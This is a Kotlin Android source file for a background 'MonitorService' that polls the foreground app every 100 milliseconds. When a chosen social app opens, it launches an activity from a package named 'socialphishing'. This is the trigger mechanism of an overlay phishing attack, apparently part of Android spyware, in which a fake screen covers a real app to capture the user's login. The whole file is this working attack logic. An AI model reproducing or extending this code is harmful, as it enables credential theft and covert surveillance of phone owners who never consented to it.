package com.example.rule.dash.services.social

import android.content.Intent
import com.example.rule.dash.services.base.BaseService
import com.example.rule.dash.ui.activities.socialphishing.SocialActivityM
import com.example.rule.dash.utils.ConstFun.getPackageCheckSocial
import com.example.rule.dash.utils.checkForegroundApp.CheckApp
import com.example.rule.dash.utils.checkForegroundApp.CheckPermission.hasUsageStatsPermission
import com.pawegio.kandroid.IntentFor
import com.pawegio.kandroid.start
import javax.inject.Inject

class MonitorService : BaseService() {

    private lateinit var appChecker: CheckApp

    @Inject
    lateinit var interactor: InteractorMonitorService

    override fun onCreate() {
        super.onCreate()
        getComponent()!!.inject(this)
        startAppChecker()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {

        if (!hasUsageStatsPermission()) interactor.setPermission(false)
        else interactor.setPermission(true)

        return START_STICKY
    }

    override fun onDestroy() {
        appChecker.stop()
        super.onDestroy()
        interactor.gerSocialStatus()
    }

    private fun startAppChecker() {
        appChecker = CheckApp(this) { app ->
            if (app == getPackageCheckSocial()) { startApp() }
        }.setTimeout(100).start()
    }

    private fun startApp() {
        val intent = IntentFor<SocialActivityM>(this)
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        intent.start(this)
    }

}